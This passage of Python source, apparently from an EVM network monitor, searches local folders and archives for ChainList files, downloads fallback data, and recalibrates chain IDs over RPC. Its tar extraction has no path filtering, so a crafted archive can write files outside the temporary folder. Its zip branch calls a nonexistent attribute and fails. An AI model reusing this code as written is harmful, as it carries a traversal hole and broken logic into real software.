            print(f"\n{Fore.RED}❌ 在所有可能的位置都没有找到文件: {filename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 搜索的位置包括：{Style.RESET_ALL}")
            for path in search_paths[:5]:  # 只显示前5个
                if os.path.exists(path):
                    print(f"   • {path}")
            return None
        
        # 如果只找到一个文件，直接返回
        if len(found_files) == 1:
            selected_file = found_files[0]
            print(f"\n{Fore.GREEN}✅ 自动选择文件: {selected_file['path']}{Style.RESET_ALL}")
            return selected_file['path']
        
        # 多个文件时让用户选择
        print(f"\n{Fore.YELLOW}📋 找到多个匹配的文件，请选择：{Style.RESET_ALL}")
        for i, file_info in enumerate(found_files, 1):
            match_icon = {
                'exact': '🎯',
                'fuzzy': '🔍', 
                'wildcard': '🌟'
            }.get(file_info['match_type'], '📄')
            
            print(f"  {Fore.GREEN}{i:2d}.{Style.RESET_ALL} {match_icon} {os.path.basename(file_info['path'])} "
                  f"({file_info['size']} KB) - {file_info['location']}")
        
        choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择文件编号 (1-{len(found_files)}): {Style.RESET_ALL}").strip()
        
        if choice.isdigit():
            index = int(choice) - 1
            if 0 <= index < len(found_files):
                selected_file = found_files[index]
                print(f"\n{Fore.GREEN}✅ 已选择: {selected_file['path']}{Style.RESET_ALL}")
                return selected_file['path']
        
        print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
        return None
    
    def _select_file_from_directory(self) -> str:
        """从当前目录选择文件"""
        try:
            import os
            import glob
            
            # 查找文本文件
            text_files = []
            for pattern in ['*.txt', '*.json', '*.data']:
                text_files.extend(glob.glob(pattern))
            
            if not text_files:
                print(f"\n{Fore.YELLOW}⚠️ 当前目录没有找到文本文件{Style.RESET_ALL}")
                return None
            
            print(f"\n{Fore.YELLOW}📋 当前目录的文件：{Style.RESET_ALL}")
            for i, file in enumerate(text_files, 1):
                file_size = os.path.getsize(file) // 1024  # KB
                print(f"  {Fore.GREEN}{i:2d}.{Style.RESET_ALL} {file} ({file_size} KB)")
            
            choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择文件编号: {Style.RESET_ALL}").strip()
            if choice.isdigit():
                index = int(choice) - 1
                if 0 <= index < len(text_files):
                    return text_files[index]
            
            print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
            return None
            
        except Exception as e:
            print(f"\n{Fore.RED}❌ 读取目录失败: {e}{Style.RESET_ALL}")
            return None
    
    def _smart_find_chainlist_file(self, filename: str = None) -> str:
        """增强版智能查找ChainList文件 - 支持递归搜索、模糊匹配、内容检测"""
        print(f"\n{Fore.CYAN}🔍 增强版智能搜索ChainList文件...{Style.RESET_ALL}")
        
        # 第一阶段：精确匹配指定文件名
        if filename:
            print(f"{Back.BLUE}{Fore.WHITE} 第一阶段：精确搜索指定文件 {Style.RESET_ALL}")
            result = self._search_exact_file(filename)
            if result:
                return result
        
        # 第二阶段：默认文件名搜索
        print(f"{Back.BLUE}{Fore.WHITE} 第二阶段：默认文件名搜索 {Style.RESET_ALL}")
        default_filenames = [
            'chainlist.txt', 'chainlist.json', 'chains.json', 
            '1.txt', '2.txt', '3.txt', 'network.json', 'networks.json',
            'rpc.json', 'rpc_list.json', 'blockchain.json'
        ]
        
        for fname in default_filenames:
            print(f"  🔍 搜索: {fname}")
            result = self._search_exact_file(fname)
            if result:
                return result
        
        # 第三阶段：模糊文件名匹配
        print(f"{Back.BLUE}{Fore.WHITE} 第三阶段：模糊文件名匹配 {Style.RESET_ALL}")
        result = self._search_fuzzy_filename()
        if result:
            return result
        
        # 第四阶段：内容特征检测
        print(f"{Back.BLUE}{Fore.WHITE} 第四阶段：智能内容检测 {Style.RESET_ALL}")
        result = self._search_by_content()
        if result:
            return result
        
        # 第五阶段：压缩文件搜索
        print(f"{Back.BLUE}{Fore.WHITE} 第五阶段：压缩文件搜索 {Style.RESET_ALL}")
        result = self._search_compressed_files()
        if result:
            return result
        
        # 第六阶段：网络下载备用方案
        print(f"{Back.BLUE}{Fore.WHITE} 第六阶段：网络下载备用方案 {Style.RESET_ALL}")
        result = self._download_chainlist_fallback()
        if result:
            return result
        
        print(f"  {Fore.RED}❌ 所有搜索方式均未找到ChainList文件{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}💡 建议解决方案：{Style.RESET_ALL}")
        print(f"  1. 检查文件是否放在正确位置（当前目录、Downloads、Desktop、Documents）")
        print(f"  2. 确认文件名包含关键词：chain、network、rpc、blockchain等")
        print(f"  3. 尝试手动指定完整文件路径")
        print(f"  4. 下载最新的ChainList数据：chainlist.org")
        return None
    
    def _search_exact_file(self, filename: str) -> str:
        """精确搜索指定文件名"""
        # 扩展的搜索路径
        search_paths = [
            '.',  # 当前目录
            os.path.expanduser('~'),  # 用户主目录
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Downloads/chainlist'),
            os.path.expanduser('~/Desktop/chainlist'),
            '/tmp', '/var/tmp',
            '/home', '/root',  # Linux系统目录
            '/Users', '/Users/Shared',  # macOS系统目录
            'C:\\Users', 'C:\\Downloads', 'C:\\temp',  # Windows系统目录
        ]
        
        # 添加常见的项目目录
        project_dirs = ['chainlist', 'blockchain', 'web3', 'ethereum', 'networks', 'rpc']
        for base_path in [os.path.expanduser('~'), '.']:
            for project_dir in project_dirs:
                search_paths.append(os.path.join(base_path, project_dir))
        
        # 1. 直接路径搜索
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
                
            file_path = os.path.join(search_path, filename)
            if os.path.isfile(file_path):
                file_size = os.path.getsize(file_path)
                if file_size > 0:  # 确保文件不为空
                    print(f"  {Fore.GREEN}✅ 找到文件: {file_path} ({file_size//1024} KB){Style.RESET_ALL}")
                    return file_path
        
        # 2. 递归搜索（限制深度避免性能问题）
        recursive_paths = [
            '.',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
        ]
        
        for base_path in recursive_paths:
            if not os.path.exists(base_path):
                continue
            try:
                result = self._recursive_file_search(base_path, filename, max_depth=3)
                if result:
                    file_size = os.path.getsize(result)
                    print(f"  {Fore.GREEN}✅ 递归找到: {result} ({file_size//1024} KB){Style.RESET_ALL}")
                    return result
            except Exception:
                continue
        
        return None
    
    def _recursive_file_search(self, base_path: str, target_filename: str, max_depth: int = 3, current_depth: int = 0) -> str:
        """递归搜索文件"""
        if current_depth >= max_depth:
            return None
        
        try:
            for item in os.listdir(base_path):
                if item.startswith('.'):  # 跳过隐藏文件/目录
                    continue
                
                item_path = os.path.join(base_path, item)
                
                if os.path.isfile(item_path) and item == target_filename:
                    if os.path.getsize(item_path) > 0:
                        return item_path
                elif os.path.isdir(item_path):
                    result = self._recursive_file_search(item_path, target_filename, max_depth, current_depth + 1)
                    if result:
                        return result
        except (PermissionError, OSError):
            pass
        
        return None
    
    def _search_fuzzy_filename(self) -> str:
        """模糊文件名匹配"""
        # 关键词模式
        keywords = ['chain', 'network', 'rpc', 'blockchain', 'eth', 'list']
        extensions = ['.json', '.txt', '.csv', '.log']
        
        search_paths = [
            '.',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
        ]
        
        candidates = []
        
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                for filename in os.listdir(search_path):
                    if os.path.isfile(os.path.join(search_path, filename)):
                        # 检查文件名是否包含关键词
                        filename_lower = filename.lower()
                        for keyword in keywords:
                            if keyword in filename_lower:
                                for ext in extensions:
                                    if filename_lower.endswith(ext):
                                        file_path = os.path.join(search_path, filename)
                                        file_size = os.path.getsize(file_path)
                                        if file_size > 100:  # 至少100字节
                                            candidates.append((file_path, filename, file_size))
                                        break
                                break
            except (PermissionError, OSError):
                continue
        
        # 按文件大小排序，优先检查大文件
        candidates.sort(key=lambda x: x[2], reverse=True)
        
        print(f"  📋 找到 {len(candidates)} 个可能的文件:")
        for i, (file_path, filename, file_size) in enumerate(candidates[:5]):  # 只显示前5个
            print(f"    {i+1}. {filename} ({file_size//1024} KB)")
        
        # 验证候选文件
        for file_path, filename, file_size in candidates:
            if self._verify_chainlist_content(file_path):
                print(f"  {Fore.GREEN}✅ 通过内容验证: {file_path}{Style.RESET_ALL}")
                return file_path
        
        return None
    
    def _search_by_content(self) -> str:
        """基于文件内容特征检测ChainList文件"""
        search_paths = [
            '.',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
        ]
        
        candidates = []
        
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                for filename in os.listdir(search_path):
                    file_path = os.path.join(search_path, filename)
                    if os.path.isfile(file_path):
                        # 只检查可能的文件类型
                        if any(filename.lower().endswith(ext) for ext in ['.json', '.txt', '.csv']):
                            file_size = os.path.getsize(file_path)
                            if 1000 < file_size < 100*1024*1024:  # 1KB到100MB之间
                                candidates.append((file_path, filename, file_size))
            except (PermissionError, OSError):
                continue
        
        print(f"  📋 扫描 {len(candidates)} 个文件的内容特征...")
        
        # 并发检测文件内容
        valid_files = []
        
        def check_file(file_info):
            file_path, filename, file_size = file_info
            try:
                if self._verify_chainlist_content(file_path):
                    return file_path
            except:
                pass
            return None
        
        # 使用并发检测提高速度
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_file = {executor.submit(check_file, candidate): candidate for candidate in candidates[:20]}  # 限制检查数量
            
            for future in as_completed(future_to_file):
                result = future.result()
                if result:
                    valid_files.append(result)
        
        if valid_files:
            # 返回第一个有效文件
            best_file = valid_files[0]
            file_size = os.path.getsize(best_file)
            print(f"  {Fore.GREEN}✅ 内容检测发现: {best_file} ({file_size//1024} KB){Style.RESET_ALL}")
            return best_file
        
        return None
    
    def _verify_chainlist_content(self, file_path: str) -> bool:
        """验证文件是否为ChainList格式"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                # 读取前几KB检查特征
                content = f.read(8192)  # 8KB应该足够检测特征
            
            content_lower = content.lower()
            
            # ChainList特征检测
            chainlist_indicators = [
                'chainid',
                'chain_id', 
                '"rpc"',
                'explorers',
                'nativecurrency',
                'ethereum',
                'polygon',
                'binance',
                'avalanche'
            ]
            
            # 检查JSON结构特征
            json_structure_score = 0
            if content.strip().startswith('[') and ']' in content:
                json_structure_score += 2
            if content.strip().startswith('{') and '}' in content:
                json_structure_score += 1
            
            # 检查ChainList特征
            feature_score = sum(1 for indicator in chainlist_indicators if indicator in content_lower)
            
            # 检查数字模式（可能的Chain ID）
            import re
            chain_id_pattern = r'"chainid"\s*:\s*\d+|"chain_id"\s*:\s*\d+'
            if re.search(chain_id_pattern, content_lower):
                feature_score += 2
            
            # 综合评分
            total_score = json_structure_score + feature_score
            
            # 如果评分足够高，认为是ChainList文件
            return total_score >= 3
            
        except Exception:
            return False
    
    def _search_compressed_files(self) -> str:
        """搜索压缩文件中的ChainList数据"""
        import zipfile
        import tarfile
        import tempfile
        
        search_paths = [
            '.',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
        ]
        
        compressed_files = []
        
        # 查找压缩文件
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                for filename in os.listdir(search_path):
                    file_path = os.path.join(search_path, filename)
                    if os.path.isfile(file_path):
                        if any(filename.lower().endswith(ext) for ext in ['.zip', '.tar', '.tar.gz', '.tgz']):
                            file_size = os.path.getsize(file_path)
                            if 1000 < file_size < 500*1024*1024:  # 1KB到500MB
                                compressed_files.append((file_path, filename, file_size))
            except (PermissionError, OSError):
                continue
        
        if not compressed_files:
            print(f"  📋 未找到压缩文件")
            return None
        
        print(f"  📋 检查 {len(compressed_files)} 个压缩文件...")
        
        for file_path, filename, file_size in compressed_files:
            print(f"  🔍 检查: {filename}")
            
            try:
                # 创建临时目录
                with tempfile.TemporaryDirectory() as temp_dir:
                    extracted_files = []
                    
                    # 解压文件
                    if filename.lower().endswith('.zip'):
                        with zipfile.ZipFile(file_path, 'r') as zip_ref:
                            for member in zip_ref.namelist():
                                if any(ext in member.lower() for ext in ['.json', '.txt']):
                                    if member.size < 100*1024*1024:  # 限制单文件大小
                                        zip_ref.extract(member, temp_dir)
                                        extracted_files.append(os.path.join(temp_dir, member))
                    
                    elif filename.lower().endswith(('.tar', '.tar.gz', '.tgz')):
                        with tarfile.open(file_path, 'r:*') as tar_ref:
                            for member in tar_ref.getmembers():
                                if member.isfile() and any(ext in member.name.lower() for ext in ['.json', '.txt']):
                                    if member.size < 100*1024*1024:  # 限制单文件大小
                                        tar_ref.extract(member, temp_dir)
                                        extracted_files.append(os.path.join(temp_dir, member.name))
                    
                    # 检查解压出的文件
                    for extracted_file in extracted_files:
                        if os.path.exists(extracted_file) and self._verify_chainlist_content(extracted_file):
                            # 复制到当前目录
                            import shutil
                            target_filename = f"chainlist_extracted_{int(time.time())}.json"
                            target_path = os.path.join('.', target_filename)
                            shutil.copy2(extracted_file, target_path)
                            print(f"  {Fore.GREEN}✅ 从压缩文件提取: {target_path}{Style.RESET_ALL}")
                            return target_path
                            
            except Exception as e:
                print(f"    ❌ 解压失败: {e}")
                continue
        
        return None
    
    def _download_chainlist_fallback(self) -> str:
        """网络下载ChainList数据作为备用方案"""
        print(f"  🌐 尝试从网络下载ChainList数据...")
        
        # ChainList数据源
        chainlist_urls = [
            'https://chainlist.org/rpcs.json',
            'https://raw.githubusercontent.com/ethereum-lists/chains/master/_data/chains/eip155-1.json',
            'https://raw.githubusercontent.com/DefiLlama/chainlist/main/constants/chainIds.json',
            'https://api.chainlist.org/chains',
        ]
        
        for i, url in enumerate(chainlist_urls, 1):
            try:
                print(f"    {i}. 尝试下载: {url}")
                
                response = requests.get(url, timeout=10, headers={
                    'User-Agent': 'Mozilla/5.0 (compatible; EVM-Monitor/1.0)'
                })
                
                if response.status_code == 200:
                    content = response.text
                    
                    # 验证内容
                    if len(content) > 1000 and ('chainId' in content or 'chain_id' in content):
                        # 保存到本地
                        filename = f"chainlist_downloaded_{int(time.time())}.json"
                        filepath = os.path.join('.', filename)
                        
                        with open(filepath, 'w', encoding='utf-8') as f:
                            f.write(content)
                        
                        # 验证文件
                        if self._verify_chainlist_content(filepath):
                            print(f"    {Fore.GREEN}✅ 下载成功: {filepath} ({len(content)//1024} KB){Style.RESET_ALL}")
                            return filepath
                        else:
                            os.remove(filepath)
                            print(f"    ❌ 下载的文件格式验证失败")
                    else:
                        print(f"    ❌ 下载的内容不符合ChainList格式")
                else:
                    print(f"    ❌ HTTP错误: {response.status_code}")
                    
            except Exception as e:
                print(f"    ❌ 下载失败: {e}")
                continue
        
        print(f"  {Fore.RED}❌ 所有网络下载尝试均失败{Style.RESET_ALL}")
        
        # 提供手动下载指导
        print(f"\n{Fore.YELLOW}💡 手动下载指导：{Style.RESET_ALL}")
        print(f"  1. 访问 https://chainlist.org")
        print(f"  2. 导出或下载ChainList数据")
        print(f"  3. 保存为 chainlist.json 到当前目录")
        print(f"  4. 或者将文件拖拽到以下任一目录：")
        print(f"     • 当前目录")
        print(f"     • Downloads文件夹")
        print(f"     • Desktop桌面")
        print(f"     • Documents文档")
        
        return None
    
    def _interactive_file_selection(self) -> list:
        """交互式文件选择功能"""
        print(f"\n{Back.CYAN}{Fore.WHITE} 📋 交互式文件选择 📋 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}正在扫描可能的ChainList文件...{Style.RESET_ALL}")
        
        # 快速扫描所有可能的文件
        candidates = []
        search_paths = [
            '.',
            os.path.expanduser('~/Downloads'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Documents'),
        ]
        
        # 1. 扫描精确匹配的文件
        exact_matches = ['chainlist.txt', 'chainlist.json', 'chains.json', '1.txt', '2.txt', '3.txt']
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            for filename in exact_matches:
                file_path = os.path.join(search_path, filename)
                if os.path.isfile(file_path):
                    file_size = os.path.getsize(file_path)
                    if file_size > 100:
                        candidates.append({
                            'path': file_path,
                            'name': filename,
                            'size': file_size,
                            'type': 'exact',
                            'verified': False
                        })
        
        # 2. 扫描模糊匹配的文件
        keywords = ['chain', 'network', 'rpc', 'blockchain', 'eth']
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            try:
                for filename in os.listdir(search_path):
                    if any(filename.lower().endswith(ext) for ext in ['.json', '.txt', '.csv']):
                        if any(keyword in filename.lower() for keyword in keywords):
                            file_path = os.path.join(search_path, filename)
                            if os.path.isfile(file_path):
                                file_size = os.path.getsize(file_path)
                                if 1000 < file_size < 100*1024*1024:
                                    # 检查是否已经在候选列表中
                                    if not any(c['path'] == file_path for c in candidates):
                                        candidates.append({
                                            'path': file_path,
                                            'name': filename,
                                            'size': file_size,
                                            'type': 'fuzzy',
                                            'verified': False
                                        })
            except (PermissionError, OSError):
                continue
        
        if not candidates:
            print(f"  {Fore.RED}❌ 未找到任何候选文件{Style.RESET_ALL}")
            return None
        
        # 3. 验证候选文件（并发）
        print(f"  📋 验证 {len(candidates)} 个候选文件...")
        
        def verify_candidate(candidate):
            try:
                if self._verify_chainlist_content(candidate['path']):
                    candidate['verified'] = True
                    return candidate
            except:
                pass
            return None
        
        verified_candidates = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_candidate = {executor.submit(verify_candidate, candidate): candidate for candidate in candidates}
            
            for future in as_completed(future_to_candidate):
                result = future.result()
                if result and result['verified']:
                    verified_candidates.append(result)
        
        # 4. 显示选项
        all_candidates = verified_candidates + [c for c in candidates if not c['verified']]
        
        print(f"\n{Fore.YELLOW}📋 找到以下文件：{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}✅ 已验证为ChainList格式{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}⚠️  未验证，但可能包含链条数据{Style.RESET_ALL}")
        
        for i, candidate in enumerate(all_candidates[:10], 1):  # 最多显示10个
            status_icon = "✅" if candidate['verified'] else "⚠️ "
            type_text = "精确匹配" if candidate['type'] == 'exact' else "模糊匹配"
            size_text = f"{candidate['size']//1024} KB" if candidate['size'] > 1024 else f"{candidate['size']} B"
            
            print(f"  {Fore.CYAN}{i}.{Style.RESET_ALL} {status_icon} {candidate['name']} ({type_text}, {size_text})")
            print(f"       📁 {candidate['path']}")
        
        if len(all_candidates) > 10:
            print(f"       ... 还有 {len(all_candidates) - 10} 个文件")
        
        # 5. 用户选择
        while True:
            choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择文件编号 (1-{min(len(all_candidates), 10)})，或按回车取消: {Style.RESET_ALL}").strip()
            
            if not choice:
                return None
            
            try:
                index = int(choice) - 1
                if 0 <= index < min(len(all_candidates), 10):
                    selected_file = all_candidates[index]
                    print(f"\n{Fore.GREEN}✅ 已选择: {selected_file['name']}{Style.RESET_ALL}")
                    
                    # 读取文件
                    return self._read_chainlist_file(os.path.basename(selected_file['path']))
                else:
                    print(f"{Fore.RED}❌ 无效的选择，请输入 1-{min(len(all_candidates), 10)}{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}❌ 请输入数字{Style.RESET_ALL}")

    def _read_chainlist_file(self, filename: str = None) -> list:
        """读取ChainList文件（智能查找版本）"""
        # 如果提供了文件名，使用智能查找查找该文件
        if filename:
            file_path = self._smart_find_chainlist_file(filename)
        else:
            # 没有提供文件名，使用默认智能查找
            file_path = self._smart_find_chainlist_file()
            
        if not file_path:
            print(f"\n{Fore.RED}❌ 无法找到ChainList文件{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请确保以下任一文件存在：{Style.RESET_ALL}")
            print(f"  • chainlist.txt")
            print(f"  • chainlist.json") 
            print(f"  • chains.json")
            print(f"  • 1.txt")
            print(f"{Fore.YELLOW}📂 搜索目录：当前目录、Downloads、Desktop、Documents{Style.RESET_ALL}")
            return None
        try:
            print(f"\n{Fore.CYAN}📖 正在读取文件: {file_path}{Style.RESET_ALL}")
            
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
            
            if not content:
                print(f"\n{Fore.RED}❌ 文件为空{Style.RESET_ALL}")
                return None
            
            print(f"{Fore.GREEN}✅ 文件读取成功，大小: {len(content)//1024} KB{Style.RESET_ALL}")
            
            # 尝试解析JSON
            import json
            try:
                # 如果是完整的JSON数组
                if content.strip().startswith('['):
                    data = json.loads(content)
                else:
                    # 如果是单个对象的集合，尝试修复
                    if content.strip().startswith('{'):
                        # 添加数组括号并分割对象
                        content = content.strip()
                        if not content.endswith(']'):
                            # 简单修复：假设对象之间用 }, { 分隔
                            content = '[' + content.replace('}\n{', '},\n{').replace('}\n  {', '},\n  {') + ']'
                        data = json.loads(content)
                    else:
                        print(f"\n{Fore.RED}❌ 无法识别的文件格式{Style.RESET_ALL}")
                        return None
                
                print(f"{Fore.GREEN}✅ JSON解析成功，找到 {len(data)} 条链条记录{Style.RESET_ALL}")
                return data
                
            except json.JSONDecodeError as e:
                print(f"\n{Fore.RED}❌ JSON格式错误: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 提示：请确保文件是有效的JSON格式{Style.RESET_ALL}")
                return None
                
        except FileNotFoundError:
            print(f"\n{Fore.RED}❌ 文件不存在: {file_path}{Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"\n{Fore.RED}❌ 读取文件失败: {e}{Style.RESET_ALL}")
            return None
    
    def _ai_auto_calibrate_all_chains(self, chainlist_data: list, max_workers: int = 8) -> Dict[str, dict]:
        """AI全自动链条校准系统 - 智能匹配所有链条并自动校准Chain ID"""
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 🚀 AI全自动链条校准系统 🚀 {Style.RESET_ALL}")
        
        # 第一步：AI智能匹配
        matching_results = self._ai_enhanced_chain_matching(chainlist_data, max_workers)
        
        # 第二步：自动校准需要更新的链条
        calibration_results = {}
        chains_to_update = []
        chains_already_correct = []
        chains_no_match = []
        
        print(f"\n{Back.BLUE}{Fore.WHITE} 📋 分析匹配结果 📋 {Style.RESET_ALL}")
        
        for network_key, match_result in matching_results.items():
            best_match = match_result['best_match']
            local_info = match_result['local_info']
            local_chain_id = local_info.get('chain_id')
            
            if not best_match:
                chains_no_match.append({
                    'network_key': network_key,
                    'local_name': local_info.get('name', network_key),
                    'local_chain_id': local_chain_id
                })
                continue
            
            chainlist_chain_id = best_match['chain_data'].get('chainId')
            chainlist_name = best_match['chainlist_name']
            similarity = best_match['similarity']
            
            if local_chain_id == chainlist_chain_id:
                chains_already_correct.append({
                    'network_key': network_key,
                    'local_name': local_info.get('name', network_key),
                    'chainlist_name': chainlist_name,
                    'chain_id': local_chain_id,
                    'similarity': similarity
                })
            else:
                chains_to_update.append({
                    'network_key': network_key,
                    'local_name': local_info.get('name', network_key),
                    'chainlist_name': chainlist_name,
                    'old_chain_id': local_chain_id,
                    'new_chain_id': chainlist_chain_id,
                    'similarity': similarity,
                    'match_type': best_match['match_type'],
                    'chain_data': best_match['chain_data']
                })
        
        print(f"✅ 已正确: {Fore.GREEN}{len(chains_already_correct)}{Style.RESET_ALL} 个")
        print(f"🔧 需要更新: {Fore.YELLOW}{len(chains_to_update)}{Style.RESET_ALL} 个")
        print(f"❓ 无匹配: {Fore.RED}{len(chains_no_match)}{Style.RESET_ALL} 个")
        
        # 显示需要更新的链条详情
        if chains_to_update:
            print(f"\n{Back.YELLOW}{Fore.BLACK} 🔧 需要更新的链条 🔧 {Style.RESET_ALL}")
            for i, chain in enumerate(chains_to_update[:10], 1):  # 只显示前10个
                match_type_emoji = {"exact_id": "🎯", "high_similarity": "🔥", "medium_similarity": "📊"}.get(chain['match_type'], "❓")
                print(f"  {i}. {chain['local_name']} → {chain['chainlist_name']}")
                print(f"     {match_type_emoji} Chain ID: {Fore.RED}{chain['old_chain_id']}{Style.RESET_ALL} → {Fore.GREEN}{chain['new_chain_id']}{Style.RESET_ALL} (相似度: {chain['similarity']:.2%})")
            
            if len(chains_to_update) > 10:
                print(f"     ... 还有 {len(chains_to_update) - 10} 个链条需要更新")
        
        # 第三步：询问是否自动应用更新
        if chains_to_update:
            print(f"\n{Fore.CYAN}🤖 AI建议自动应用这些Chain ID更新{Style.RESET_ALL}")
            confirm = self.safe_input(f"{Fore.YELLOW}➜ 是否自动应用所有更新？(Y/n): {Style.RESET_ALL}").strip().lower()
            
            if confirm in ['', 'y', 'yes']:
                print(f"\n{Back.GREEN}{Fore.BLACK} 🚀 正在自动应用更新... 🚀 {Style.RESET_ALL}")
                
                updated_count = 0
                for chain in chains_to_update:
                    network_key = chain['network_key']
                    old_id = chain['old_chain_id']
                    new_id = chain['new_chain_id']
                    
                    # 更新网络配置
                    self.networks[network_key]['chain_id'] = new_id
                    updated_count += 1
                    
                    print(f"  ✅ {chain['local_name']}: {old_id} → {new_id}")
                
                print(f"\n{Fore.GREEN}🎉 自动更新完成！已更新 {updated_count} 个链条的Chain ID{Style.RESET_ALL}")
                
                calibration_results['updated'] = chains_to_update
            else:
                print(f"\n{Fore.YELLOW}⚠️ 用户取消了自动更新{Style.RESET_ALL}")
                calibration_results['pending_updates'] = chains_to_update
        
        calibration_results['already_correct'] = chains_already_correct
        calibration_results['no_match'] = chains_no_match
        calibration_results['total_processed'] = len(matching_results)
        
        return calibration_results

    def _auto_calibrate_chain_ids(self, chainlist_data: list, max_workers: int = 8) -> list:
        """自动校准ChainList数据中的chain ID（多线程优化版本）"""
        print(f"\n{Back.BLUE}{Fore.WHITE} 🔧 自动校准Chain ID（多线程加速） 🔧 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}正在验证和校准链条ID...（使用 {max_workers} 个线程并发处理）{Style.RESET_ALL}")
        
        # 预处理数据，提取需要验证的链条
        validation_tasks = []
        direct_append = []
        
        for i, chain_data in enumerate(chainlist_data):
            original_chain_id = chain_data.get('chainId')
            chain_name = chain_data.get('name', '')
            rpc_list = chain_data.get('rpc', [])
            
            if not original_chain_id or not rpc_list:
                direct_append.append(chain_data)
                continue
            
            # 提取第一个有效的RPC URL用于验证
            test_rpc_url = None
            for rpc_entry in rpc_list[:3]:  # 只测试前3个RPC
                if isinstance(rpc_entry, dict):
                    url = rpc_entry.get('url', '')
                elif isinstance(rpc_entry, str):
                    url = rpc_entry
                else:
                    continue
                
                if url and self._is_valid_rpc_url(url):
                    test_rpc_url = url
                    break
            
            if test_rpc_url:
                validation_tasks.append({
                    'index': i,
                    'chain_data': chain_data,
                    'rpc_url': test_rpc_url,
                    'original_chain_id': original_chain_id,
                    'chain_name': chain_name
                })
            else:
                direct_append.append(chain_data)
        
        # 多线程处理验证任务
        calibrated_data = []
        calibration_count = 0
        validation_count = 0
        completed_count = 0
        
        def validate_chain_id(task):
            try:
                actual_chain_id = self._get_actual_chain_id(task['rpc_url'], timeout=3)
                return {
                    'task': task,
                    'actual_chain_id': actual_chain_id,
                    'success': True
                }
            except Exception as e:
                return {
                    'task': task,
                    'actual_chain_id': None,
                    'success': False,
                    'error': str(e)
                }
        
        # 使用线程池并发执行
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有任务
            future_to_task = {executor.submit(validate_chain_id, task): task for task in validation_tasks}
            
            # 处理完成的任务
            for future in as_completed(future_to_task):
                task = future_to_task[future]
                completed_count += 1
                
                # 更新进度
                print(f"\r{Fore.YELLOW}🚀 验证进度: {completed_count}/{len(validation_tasks)} ({completed_count*100//len(validation_tasks)}%)...{Style.RESET_ALL}", end='', flush=True)
                
                try:
                    result = future.result()
                    chain_data = result['task']['chain_data']
                    original_chain_id = result['task']['original_chain_id']
                    chain_name = result['task']['chain_name']
                    actual_chain_id = result['actual_chain_id']
                    
                    validation_count += 1
                    
                    if actual_chain_id is None:
                        # 无法获取实际chain ID，保持原始数据
                        calibrated_data.append(chain_data)
                    elif actual_chain_id != original_chain_id:
                        # chain ID不匹配，进行校准
                        calibrated_chain_data = chain_data.copy()
                        calibrated_chain_data['chainId'] = actual_chain_id
                        calibrated_chain_data['_calibrated'] = True
                        calibrated_chain_data['_original_chain_id'] = original_chain_id
                        calibrated_data.append(calibrated_chain_data)
                        calibration_count += 1
                        print(f"\n  🔧 {Fore.YELLOW}校准{Style.RESET_ALL}: {chain_name[:40]} ID {original_chain_id} → {actual_chain_id}")
                    else:
                        # chain ID正确，保持原始数据
                        calibrated_data.append(chain_data)
                        
                except Exception as e:
                    # 出错时保持原始数据
                    calibrated_data.append(result['task']['chain_data'])
                    self.logger.warning(f"处理校准结果时出错: {e}")
        
        # 添加直接追加的数据
        calibrated_data.extend(direct_append)
        
        print(f"\n\n{Back.GREEN}{Fore.BLACK} 📊 多线程校准完成 📊 {Style.RESET_ALL}")
        print(f"⚡ 使用线程: {Fore.MAGENTA}{max_workers}{Style.RESET_ALL} 个")
        print(f"🔍 验证链条: {Fore.CYAN}{validation_count}{Style.RESET_ALL} 个")
        print(f"🔧 校准链条: {Fore.GREEN}{calibration_count}{Style.RESET_ALL} 个")
        print(f"✅ 处理完成: {Fore.CYAN}{len(calibrated_data)}{Style.RESET_ALL} 个链条数据")
        
        return calibrated_data
    
    def _get_actual_chain_id(self, rpc_url: str, timeout: int = 2) -> int:
        """获取RPC实际的chain ID（单线程版本）"""
        try:
            from web3 import Web3
            
            # 根据URL类型选择提供者
            if rpc_url.startswith(('ws://', 'wss://')):
                provider = Web3.WebsocketProvider(rpc_url, websocket_kwargs={'timeout': timeout})
            else:
                provider = Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': timeout})
            
            w3 = Web3(provider)
            
            # 测试连接并获取chain ID
            if w3.is_connected():
                chain_id = w3.eth.chain_id
                return chain_id
            else:
                return None
                
        except Exception:
            return None

